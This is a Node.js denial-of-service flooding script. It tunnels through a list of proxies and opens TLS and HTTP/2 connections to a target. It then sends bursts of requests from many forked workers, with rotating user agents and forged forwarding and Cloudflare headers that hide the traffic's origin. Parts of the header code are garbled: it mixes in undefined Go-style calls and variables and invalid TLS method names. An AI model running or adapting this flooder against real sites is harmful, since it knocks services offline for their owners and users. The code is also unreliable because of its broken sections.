const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const request_2 = require('request');
const fs = require("fs");
const colors = require('colors');

lang_header = ['pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7', 'es-ES,es;q=0.9,gl;q=0.8,ca;q=0.7', 'ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7', 'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7', 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7', 'zh-TW,zh-CN;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6', 'nl-NL,nl;q=0.9,en-US;q=0.8,en;q=0.7', 'fi-FI,fi;q=0.9,en-US;q=0.8,en;q=0.7', 'sv-SE,sv;q=0.9,en-US;q=0.8,en;q=0.7', 'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
 'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5', 'en-US,en;q=0.5', 'en-US,en;q=0.9', 'de-CH;q=0.7', 'da, en-gb;q=0.8, en;q=0.7', 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',],
 accept_header = [
  'application/json',
'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9',
  'text/html; charset=utf-8',
  'application/json, text/plain, */*',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
],
controle_header = [
  'max-age=604800',
  'proxy-revalidate',
  'public, max-age=0',
  'max-age=315360000',
  'public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800',
  's-maxage=604800',
  'max-stale',
  'public, immutable, max-age=31536000',
  'must-revalidate',
  'private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0',
  'max-age=31536000,public,immutable',
  'max-age=31536000,public',
  'min-fresh',
  'private',
  'public',
  's-maxage',
  'no-cache',
  'no-cache, no-transform',
  'max-age=2592000',
  'no-store',
  'no-transform',
  'max-age=31557600',
  'stale-if-error',
  'only-if-cached',
  'max-age=0',
  'must-understand, no-store',
  'max-age=31536000; includeSubDomains',
  'max-age=31536000; includeSubDomains; preload',
  'max-age=120',
  'max-age=0,no-cache,no-store,must-revalidate',
  'public, max-age=604800, immutable',
  'max-age=0, must-revalidate, private',
  'max-age=0, private, must-revalidate',
  'max-age=604800, stale-while-revalidate=86400',
  'max-stale=3600',
  'public, max-age=2678400',
  'min-fresh=600',
  'public, max-age=30672000',
  'max-age=31536000, immutable',
  'max-age=604800, stale-if-error=86400',
  'public, max-age=604800',
  'no-cache, no-store,private, max-age=0, must-revalidate',
  'o-cache, no-store, must-revalidate, pre-check=0, post-check=0',
  'public, s-maxage=600, max-age=60',
  'public, max-age=31536000',
  'max-age=14400, public',
  'max-age=14400',
  'max-age=600, private',
  'public, s-maxage=600, max-age=60',
  'no-store, no-cache, must-revalidate',
  'no-cache, no-store,private, s-maxage=604800, must-revalidate',
  'Sec-CH-UA,Sec-CH-UA-Arch,Sec-CH-UA-Bitness,Sec-CH-UA-Full-Version-List,Sec-CH-UA-Mobile,Sec-CH-UA-Model,Sec-CH-UA-Platform,Sec-CH-UA-Platform-Version,Sec-CH-UA-WoW64',
]
encoding_header = [
'gzip, deflate, br',
'compress, gzip',
'deflate, gzip',
'gzip, identity',
'*'
]
cache_header = [
    'max-age=0',
    'no-cache',
    'no-store', 
    'must-revalidate',
    'proxy-revalidate',
    's-maxage=604800',
    'no-cache, no-store,private, max-age=0, must-revalidate',
    'no-cache, no-store,private, s-maxage=604800, must-revalidate',
    'no-cache, no-store,private, max-age=604800, must-revalidate',
],
Generate_Encoding = [
    '*',
    'gzip, deflate',
    'br;q=1.0, gzip;q=0.8, *;q=0.1',
    'gzip',
    'gzip, compress',
    'compress, deflate',
    'compress',
    'gzip, deflate, br',
    'deflate',
],
language_header = [
    'en-GB,en;q=0.7',
    'en-GB-oxendict,en;q=0.9,pl-PL;q=0.8,pl;q=0.7',
],
dest_header = [
    'audio',
    'audioworklet',
    'document',
    'embed',
    'empty',
    'font',
    'frame',
    'iframe',
    'image',
    'manifest',
    'object',
    'paintworklet',
    'report',
    'script',
    'serviceworker',
    'sharedworker',
    'style',
    'track',
    'video',
    'worker',
    'xslt'
],
mode_header = [
    'cors',
    'navigate',
    'no-cors',
    'same-origin',
    'websocket'
],
site_header = [
    'cross-site',
    'same-origin',
    'same-site',
    'none'
],
sec_ch_ua = [
    '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
    '"Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"'
];

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {
});

if (process.argv.length < 7) {
  console.log('node tls target time rate thread proxy'.rainbow);
  process.exit();
}

const headers = {};

function readLines(filePath) {
   return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
   return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
   return elements[randomIntn(0, elements.length)];
} 

const args = {
   target: process.argv[2],
   time: ~~process.argv[3],
   Rate: ~~process.argv[4],
   threads: ~~process.argv[5],
   proxyFile: process.argv[6]
}

var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }

    // Kiểm tra nếu protocol adalah 'http:', maka ubah menjadi 'https:'
    if (parsedTarget.protocol === 'https:') {
        parsedTarget.protocol = 'https:';
    }

    const targetHost = parsedTarget.host;
    const targetPort = parsedTarget.protocol === 'https:' ? 443 : 80;

    setTimeout(() => {
        process.exit(1);
    }, process.argv[3] * 1000);
} 

if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder)
}

setTimeout(function() {
    process.exit(1);
}, process.argv[3] * 1000);

process.on('uncaughtException', function(er) {
});

process.on('unhandledRejection', function(er) {
});

class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = "CONNECT " + options.address + ":443 HTTPS/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = new Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port,
            allowHalfOpen: true,
            writable: true,
            readable: true,
        });

        connection.setTimeout(options.timeout * 10 * 10000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTPS/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

    }
}

function readUserAgents(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function getRandomUserAgent() {
    const userAgents = readUserAgents('ua.txt');
    return randomElement(userAgents);
}

const Header = new NetSocket();
headers[":method"] = "GET";
headers[":path"] = parsedTarget.path;
headers[":scheme"] = "https";
headers[":authority"] = randomString(10) + "." + parsedTarget.host;
headers["accept"] = randomHeaders['accept'];
headers["Accept-Encoding"] = "gzip, deflate, br";
headers["accept-language"] = headerFunc.lang();
headers["accept-encoding"] = headerFunc.encoding();
headers["Connection"] = Math.random() > 0.5 ? "keep-alive" : "close";
headers["upgrade-insecure-requests"] = Math.random() > 0.5;
headers["x-requested-with"] = "XMLHttpRequest";
headers["pragma"] = Math.random() > 0.5 ? "no-cache" : "max-age=0";
headers["cache-control"] = Math.random() > 0.5 ? "no-cache" : "max-age=0";
headers["User-Agent"] = headersUseragents[rand.Intn(len(headersUseragents))];
headers["Cache-Control"] = "no-cache";
headers["Cache-Control"] = "max-age=0";
headers["Upgrade-Insecure-Requests"] = "1";
headers["Content-Type"] = "application/x-www-form-urlencoded";
headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
headers["Accept-Encoding"] = "gzip, deflate";
headers["Accept-Language"] = "en-US,en;q=0.9";
headers["Cookie"] = "userLanguage=en";
headers["Connection"] = "close";
headers["Accept-Charset"] = acceptCharset;
headers["Connection"] = "keep-alive";
headers["Host"] = host;
headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
headers["Accept-Encoding"] = "gzip, deflate, br";
headers["Accept-Language"] = "de,en-US;q=0.7,en;q=0.3";
headers["Cache-Control"] = "no-cache";
headers["Pragma"] = "no-cache";
headers["Upgrade-Insecure-Requests"] = "1";
headers["Sec-Fetch-Dest"] = "document";
headers["Sec-Fetch-Mode"] = "navigate";
headers["Sec-Fetch-Site"] = "none";
headers["Sec-Fetch-User"] = "?1";
headers["X-Requested-With"] = "XMLHttpRequest";
headers["Referer"] = headersReferers[rand.Intn(len(headersReferers))] + buildblock(rand.Intn(5) + 5);
headers["Keep-Alive"] = strconv.Itoa(rand.Intn(500) + 1000);
headers["scheme"] = "https";
headers["x-forwarded-proto"] = "https";
headers["cache-control"] = "no-cache";
headers["X-Forwarded-For"] = "spoofed";
headers["sec-ch-ua-mobile"] = "?0";
headers["sec-ch-ua-platform"] = "Windows";
headers["accept-language"] = "lang";
headers["accept-encoding"] = "encoding";
headers["accept"] = "accept";
headers["referer"] = "Ref";
headers["sec-fetch-mode"] = "navigate";
headers["sec-fetch-dest"] = "dest1";
headers["sec-fetch-user"] = "?1";
headers["TE"] = "trailers";
headers["scheme"] = "https";
headers["path"] = "443";
headers["x-forwarded-proto"] = "https";
headers["dnt"] = "1";
headers["sec-gpc"] = "1";
headers["host"] = "parsedTarget.host";
headers["cf-ray"] = "7fd05951dcaf3901-SJC";
headers["pragma"] = "o-cache";
headers["x-forwarded-for"] = "84.32.40.7";
headers["cf-visitor"] = "{\"scheme\":\"https\"}";
headers["cdn-loop"] = "cloudflare";
headers["cf-connecting-ip"] = "84.32.40.7";
headers["backendServers"] = "https://justloveyou-backend-api-server01.hf.space/v1";
headers["cf-ipcountry"] = "LT";
headers["upgrade-insecure-requests"] = "1";
headers["proxy"] = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=anonymous";
headers["client-control"] = "max-age=43200, s-max-age=43200";

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    headers[":authority"] = parsedTarget.host
    headers["user-agent"] = getRandomUserAgent();

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 100
    };

    Header.HTTP(proxyOptions, (connection, error) => {
        if (error) return

        connection.setKeepAlive(true, 60000);

        const tlsOptions = {
            ALPNProtocols: ['h3', 'h2', 'http/1.1', 'h1', 'spdy/3.1', 'http/2+quic/43', 'http/2+quic/44', 'http/2+quic/45'],
            echdCurve: ["ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512", "ecdsa_brainpoolP384r1tls13_sha384", "ecdsa_brainpoolP512r1tls13_sha512", "ecdsa_sha1", "rsa_pss_pss_sha384", "GREASE:x25519:secp256r1:secp384r1", "GREASE:X25519:x25519", "GREASE:X25519:x25519:P-256:P-384:P-521:X448"],
            ciphers: "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA",            rejectUnauthorized: false,
            socket: connection,
            honorCipherOrder: true,
            secure: true,
            port: 443,
            uri: parsedTarget.host,
            servername: parsedTarget.host,
            secureProtocol: ["TLS_client_method", "TLS_method", "TLSv1_method", "TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method", "TLSv2_method", "TLSv2_1_method", "TLSv2_2_method", "TLSv2_3_method", "TLSv3_method", "TLSv3_1_method", "TLSv3_2_method", "TLSv3_3_method"],
            secureOptions: crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION |
                           crypto.constants.SSL_OP_NO_TICKET |
                           crypto.constants.SSL_OP_NO_COMPRESSION |
                           crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
                           crypto.constants.SSL_OP_NO_SSLv2 |
                           crypto.constants.SSL_OP_NO_SSLv3 |
                           crypto.constants.SSL_OP_NO_TLSv1 |
                           crypto.constants.SSL_OP_NO_TLSv1_1,
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 

        tlsConn.setKeepAlive(true, 60 * 1000);
        tlsConn.setMaxListeners(0);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                enablePush: false,
                initialWindowSize: 1073741823,
                maxFrameSize: 16384,
                maxHeaderListSize: 32768,
                enableConnectProtocol: true,
            },
            maxSessionMemory: 3333,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
            session: Math.random() > 0.5 ? undefined : undefined
        });

        client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    headers["referer"] = "https://" + parsedTarget.host + parsedTarget.path;
                    const request = client.request(headers)
                    .on("response", response => {
                        request.close();
                        request.destroy();
                        return
                    });

                    request.end();
                }
            }, 1000); 
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
            return
        });

        client.on("error", error => {
            client.destroy();
            connection.destroy();
            return
        });
    });
}

function randomString(length) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}
